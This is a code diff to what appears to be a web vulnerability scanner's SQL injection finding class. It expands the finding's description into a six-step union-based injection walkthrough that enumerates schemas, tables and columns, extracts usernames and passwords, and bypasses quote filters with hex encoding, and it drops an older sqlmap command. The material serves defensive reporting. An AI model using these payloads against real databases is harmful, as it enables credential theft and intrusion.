@@ -88,11 +88,15 @@ export class SqlInjection extends FindingBase {
     static type() { return 'vulnerability'; }
     static wstgCode() { return ['WSTG-INPV-05']; }
     static description() {
-        return 'SQL injection lets an atacker alter queries executed on the backend databse. May allow data extracton or privilege escaltion.<br><br>' +
-            '<b>Exploitation Extration:</b><br>' +
-            '1. Try <code>ORDER BY 10--</code> to find logical column count.<br>' +
-            '2. Try <code>UNION SELECT 1,database(),table_name,4 FROM information_schema.tables--</code> to extract schemas.<br>' +
-            '3. Sqlmap via: <code>sqlmap -u "&lt;url&gt;" -p &lt;param&gt; --dbs</code>';
+        return 'SQL injection lets an attacker alter queries connecting to the backend database. May allow data extraction, authentication bypass, or privilege escalation.<br><br>' +
+            '<b>Exploitation Verification (Union-Based):</b><br>' +
+            '1. Find column count: <code>ORDER BY 1</code>, <code>ORDER BY 2</code>, etc. until the layout changes or errors.<br>' +
+            '2. Reveal print fields: <code>UNION SELECT 1,2,3#</code> (matching the discovered column count).<br>' +
+            '3. Discover schemas: <code>UNION SELECT 1,database(),3 FROM information_schema.schemata#</code><br>' +
+            '4. Discover tables: <code>UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()#</code><br>' +
+            '5. Discover columns: <code>UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name="users"#</code><br>' +
+            '6. Extract data: <code>UNION SELECT password,username,3 FROM users#</code><br>' +
+            '<i>Tip: If quotes are filtered, use HEX encoding strings like <code>0x7573657273</code> instead of <code>"users"</code></i>';
     }
     static solution() {
         return 'Use paramterized statements. Never embed user input directly in SQL.';
